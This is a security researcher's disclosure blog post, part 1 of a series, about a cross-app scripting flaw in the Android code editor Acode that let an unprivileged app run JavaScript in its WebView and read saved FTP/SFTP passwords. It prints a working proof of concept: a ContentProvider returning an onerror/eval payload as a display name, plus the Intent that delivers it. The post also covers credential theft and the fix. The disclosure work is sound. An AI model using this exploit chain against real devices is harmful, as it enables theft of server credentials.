---
title: "Cross-app scripting in Acode, part 1: what I found"
date: 2026-08-17T18:00:00+05:00
categories: ["Research"]
tags: ["android", "webview", "cordova", "xss", "disclosure", "mobile"]
description: "Any app on the phone, holding no permissions at all, could run JavaScript inside Acode's WebView and read the SSH and FTP passwords it had saved. GHSA-x24x-425w-326q, CVSS 8.3."
weight: 1
ShowToc: true
TocOpen: false
aliases: ["/posts/anatomy-of-ghsa-x24x-425w-326q/"]
cover:
  image: "/img/posts/acode/01-js-executing-in-webview.webp"
---

This is part 1 of three.

1. **What I found** — you are here
2. [How I found it](/posts/acode-cross-app-scripting-how-i-found-it/) — the methodology, step by step
3. [How to prevent it](/posts/acode-cross-app-scripting-how-to-prevent-it/) — the developer takeaway

---

[Acode](https://acode.app/) is an Android code editor with over a million installs. It is built on
Cordova, which means the entire editor is HTML and JavaScript running inside a WebView, with a bridge
that hands that JavaScript real device capabilities: the filesystem, an SFTP client, an FTP client, a
terminal.

In July 2026 I found a way for any app on the device — an app holding no permissions at all beyond
`INTERNET` — to get its own JavaScript running inside that WebView. Once it runs, it inherits the
whole bridge, and it can read the SSH and FTP passwords Acode has saved.

It is reported, fixed and published as
[GHSA-x24x-425w-326q](https://github.com/Acode-Foundation/Acode/security/advisories/GHSA-x24x-425w-326q).
CVSS v4.0 8.3, High. Fixed in 1.12.9.

The whole bug is one unescaped variable. What makes it interesting is not the variable — it is
*where the variable comes from*, and the fact that the project had already fixed this exact class of
bug two years earlier and missed this instance.

## The short version

A code editor shows you a list of open files. Acode builds each row of that list by pasting the
file's name into a string of HTML:

```js
`<strong style="font-size: 1rem;">${name}</strong>`
```

and then assigning that string to `innerHTML`. Nothing escapes `name`.

If a filename can contain `<img src=x onerror=...>`, that is script execution. On a normal desktop
you would shrug, because you control your own filenames. On Android you do not, and that is the whole
finding.

## Why the filename is not yours

When an Android app opens a file that another app handed it, it usually receives a `content://` URI
rather than a path. To show something useful in the UI, the receiving app asks the providing app for a
human-readable name, through a column called `OpenableColumns.DISPLAY_NAME`.

That name is not read off a disk. It is a string the *other app* returns from a database cursor. The
providing app chooses it freely.

This matters more than it sounds, because a real filename is a hostile place to hide a payload:

| Container | Length limit | `/` allowed | Quotes allowed | Spaces allowed |
|---|---|---|---|---|
| Real filename on disk | 255 bytes | no | yes | yes |
| `content://` display name | none | yes | yes | yes |

A real filename cannot hold standard Base64, because Base64's alphabet includes `/`. A display name
can hold anything. In my proof of concept the display name was **2,868 characters** long and carried
an entire Base64-encoded JavaScript payload.

Google has a name for this bug class in their own developer guidance:
`untrustworthy-contentprovider-provided-filename`. It is a known trap. Acode fell into it.

## The chain

Three links: where the attacker's string enters, where it becomes HTML, and what makes it render.

### 1. The source

`EditorFile.name` (`src/lib/editorFile.js:881`) returns the same private `#name` field as
`get filename()` at `:672`. For a file opened from a `content://` URI, that field holds the display
name the other app supplied.

That is worth pausing on: **it is the same value that the project's 2024 security issue was about.**

### 2. The sink

`generateHints()` in `src/palettes/findFile/index.js` pushes every open file into a row builder:

```js
editorManager.files.forEach((file) => {
	const { uri, name } = file;
	let { location = "" } = file;
	if (location) location = helpers.getVirtualPath(location);
	list.push(hintItem(name, location, uri));
});
list.push(...files(hintItem));   // plus every file in any opened folder
```

and `hintItem()` builds the row HTML by interpolation:

```js
return {
	text: `<div style="display: flex; flex-direction: column;">
        <strong style="font-size: 1rem;">${name}</strong>
        <span style="font-size: 0.8rem; opacity: 0.8;">${subText}</span>
      <div>`,
	value: url,
};
```

Both `${name}` and `${subText}` are raw. That string then reaches the actual sink in
`src/components/inputhints/index.js:371`:

```js
return <li attr-action="hint" attr-value={value} innerHTML={text}></li>;
```

There is no `DOMPurify` import anywhere in that file.

### 3. The trigger

`findFile`, bound to **Ctrl-P** (`src/lib/commands.js:203`, `src/lib/keyBindings.js:27`).

That is the entire trigger. Open the palette. In a code editor, Ctrl-P is muscle memory — it is among
the most-pressed shortcuts there is.

## Why the 2024 fix did not cover it

In December 2024 the project fixed an XSS reported as issue #1090. The commit is `42002a67`,
*"fix: XSS security issue #1090"*. Four files, `+8/−4`:

- added the `dompurify` dependency
- `src/dialogs/alert.js`: `innerHTML: message` → `innerHTML: DOMPurify.sanitize(message)`
- the same treatment in `src/dialogs/confirm.js` and `src/dialogs/loader.js`

Look at what that fix did *not* touch: any source. `src/lib/checkFiles.js` still passes the raw
filename. `helpers.errorMessage()` still deliberately builds HTML out of error strings.

The fix was applied entirely at the sinks. So the useful question was never "is the filename
escaped?" — it never was, and still isn't. The question was:

> Which *other* sinks does that same unescaped filename reach?

The Find-File palette. Same value, same app, a sink the fix never covered, still open two years later.

## Proof, step by step

All of this ran on a throwaway emulator against the public release APK. Acode `v1.12.6`
(versionCode 1001), Android 17, WebView Chrome 145.0.7632.218.

### The palette parses the injection

The first thing to establish is not "did code run" but the narrower question: **is the filename being
escaped, or parsed?** Those are different outcomes and they look different on screen.

![The Find-File palette rendering a broken-image icon where the injected img tag was parsed, with the remainder of the payload spilling out as visible text](/img/posts/acode/04-palette-broken-image-icon.webp)

That broken-image icon is the answer. The browser tried to load an image called `x`, failed, and drew
the broken-image placeholder. It only does that for a real `<img>` element. Had the filename been
escaped, you would see the literal text `<img src=x ...>` instead.

In `logcat` the same fact shows up as:

```
java.io.FileNotFoundException: www/x
```

The WebView went looking for a file named `x` on disk. It only does that if it parsed an image tag.

This screenshot is also a *failed* payload, which is why the rest of the text is visible next to the
icon. Part 2 covers why — it turns on a single `>` character.

### The payload executes

With the payload fixed, the JavaScript runs inside Acode's own WebView:

![Full-screen overlay injected into Acode showing origin https://localhost, Cordova 15.0.0, localStorage contents, and the bridge globals ftp, sftp, Terminal, iap, system and acode](/img/posts/acode/01-js-executing-in-webview.webp)

The lines that matter:

```
origin  : https://localhost
cordova : 15.0.0  platform=android
--- bridge-ish globals: cordova, Cordova, ftp, sftp, Terminal, iap, system, acode
```

`origin` is `https://localhost`, not `file://`. Every piece of app content lives in one web origin, so
there is no same-origin boundary between the injected code and the editor itself. The injected script
is not sandboxed away from anything.

### Delivered by an app with no permissions

The file-on-disk route needs write access to a directory Acode reads. The route that actually matters
needs nothing at all.

![The same payload output, this time with uri=content://com.example.myapplication.payload/payload.txt, showing delivery from an unprivileged third-party app](/img/posts/acode/02-delivered-by-unprivileged-app.webp)

The attacking app declares a `ContentProvider` and returns the payload as the display name:

```java
@Override
public Cursor query(Uri uri, String[] projection, String sel, String[] args, String sort) {
    String[] cols = projection != null ? projection
            : new String[]{ OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE };
    MatrixCursor c = new MatrixCursor(cols);
    String b64  = Base64.encodeToString(payloadJs.getBytes(), Base64.NO_WRAP);
    String name = "<img src=x onerror=\"eval(atob('" + b64 + "'))\">.txt";
    c.addRow(new Object[]{ name, name.length() });
    return c;
}
```

Registered in the manifest, plus a `<queries>` block so the app can see Acode at all on API 30+:

```xml
<queries><package android:name="com.foxdebug.acode" /></queries>

<provider
    android:name=".PayloadProvider"
    android:authorities="com.example.myapplication.payload"
    android:exported="true"
    android:grantUriPermissions="true" />
```

Then it just asks Acode to open the file:

```java
Intent i = new Intent(Intent.ACTION_VIEW);
i.setDataAndType(Uri.parse("content://com.example.myapplication.payload/payload.txt"), "text/plain");
i.setPackage("com.foxdebug.acode");
i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
startActivity(i);
```

Confirmed in `logcat`:

```
PayloadProvider: served display name, 2868 chars
ACODE_PWN === JS executing inside Acode's WebView ===
ACODE_PWN origin : https://localhost
uri=content://com.example.myapplication.payload/payload.txt
```

The full sequence is four steps, no root and no adb:

1. The attacking app exposes a `ContentProvider` returning the payload as `DISPLAY_NAME`
2. It sends `ACTION_VIEW` with `FLAG_GRANT_READ_URI_PERMISSION` to `com.foxdebug.acode`
3. Acode opens the "file"
4. The victim presses Ctrl-P, and the payload runs

Step 4 is the only thing requiring the user, and it is a keystroke they press constantly.

## Impact

"XSS in an editor" sounds cosmetic. It is not, because of what the Cordova bridge exposes to any
JavaScript that runs in that origin.

![Payload output showing the private sandbox listing, a stolen FTP credential in plaintext, a successful file write into Acode's private directory, and the enumerated sftp, ftp, Terminal and system bridge methods](/img/posts/acode/03-credential-theft-and-write.webp)

Three things demonstrated:

**Reading the private sandbox.** `system.getFilesDir()` and `system.listChildren()` walk Acode's
internal storage, which is normally unreachable by other apps:

```
/data/user/0/com.foxdebug.acode/files -> [public, Documents, profileInstalled]
parent -> [cache, shared_prefs, app_webview, app_database, databases, no_backup]
```

**Reading saved server credentials.** This is the one that turns a Medium into a High. Acode stores
saved FTP and SFTP servers in `localStorage.storageList`, and `Url.formate()`
(`src/utils/Url.js:234`) puts the username and password *inside the URL*:

```js
if (username && password) string += enc(username) + ":" + enc(password) + "@"
```

So the payload does not even need a bridge call. One `localStorage` read returns the passwords in
plaintext:

```
type=ftp  alias=Prod Backup Server
url=ftp://demo-victim:hunter2@198.51.100.23:21/?mode=active&security=ftp
```

**Writing into the sandbox.** `system.writeText()` created a file in Acode's private directory,
confirmed on disk from a root shell:

```
-rw------- u0_a229 u0_a229 ... PWNED_BY_FINDFILE_XSS.txt
```

And the reach, enumerated but not invoked:

| Bridge global | Methods (excerpt) |
|---|---|
| `sftp` | **`exec`**, `connectUsingPassword`, `connectUsingKeyFile`, `getFile`, `putFile`, `rm` |
| `ftp` | **`execCommand`**, `connect`, `uploadFile`, `downloadFile`, `deleteFile` |
| `system` | `writeText`, `deleteFile`, **`setExec`**, `createSymlink`, `manageAllFiles`, `launchApp` |
| `Terminal` | `install`, `startAxs`, `stopAxs`, `uninstall`, `backup`, `restore` |
| `iap` | `purchase`, `consume`, `acknowledgePurchase` |

Stolen SFTP credentials plus `sftp.exec` means command execution on the victim's own servers. That is
the realistic worst case, and it is why a filename-rendering bug in an editor is worth 8.3.

Worth noting: that bridge has *grown*. `Terminal` and `iap` were not there in 1.10.5. The severity of
any XSS in this app rises with every release that adds a capability.

## What I deliberately did not do

The credential in the demo points at `198.51.100.23`, which is RFC 5737 TEST-NET-2 and not routable.
It is fake, and I seeded it myself for the demo.

I did not call `sftp.exec`. I did not call `system.setExec` or `deleteFile`. I did not connect to any
host or send a single byte off the device.

A report needs to *demonstrate* confidentiality and integrity loss, not *cause* it. Running a remote
command would have added no evidentiary weight and would have turned a proof of concept into an
attack.

## The fix

The maintainer took the minimal sink-side fix.
[PR #2559](https://github.com/Acode-Foundation/Acode/pull/2559), one file, `+2/−1`:

```diff
+import DOMPurify from "dompurify";
 ...
-			innerHTML={text}
+			innerHTML={DOMPurify.sanitize(text)}
```

I checked that it actually neutralises the payload, running the exact hint HTML through dompurify and
jsdom:

```
OUTPUT: <strong style="font-size: 1rem;"><img src="x">.txt</strong>
onerror survived? false   eval/atob survived? false
```

The `<img>` element survives; the `onerror` handler and the `eval(atob(...))` inside it do not. No
execution.

That closes this bug. Whether it closes the *class* is the subject of part 3.

## Timeline

| | |
|---|---|
| 2026-07-30 | Bug found and verified end to end on the emulator against the release APK |
| 2026-07-30 | Advisory drafted, private report filed via GitHub private vulnerability reporting |
| | Accepted by `bajrangCoder` (Raunak Raj) — the same maintainer who wrote the 2024 #1090 fix |
| | Fixed in PR #2559, merged to `main`, roughly 19 hours from filing to fix |
| 2026-08-17 | Advisory published as GHSA-x24x-425w-326q, CVSS v4.0 8.3 High, CWE-79 / CWE-116 / CWE-749 |
| | Reporter credit: `MYounas126` |

Fast, responsive maintainer. Consistent with their two-day turnaround on #1090.

One thing still outstanding: the advisory is published but **no CVE has been assigned**. GitHub is a
CNA, so a CVE can be requested directly from the advisory.

---

Part 2 covers the methodology: how patch-diffing an old fix pointed straight at this, and the lab
work — including the single character that silently broke my first payload.

**[Part 2: How I found it →](/posts/acode-cross-app-scripting-how-i-found-it/)**
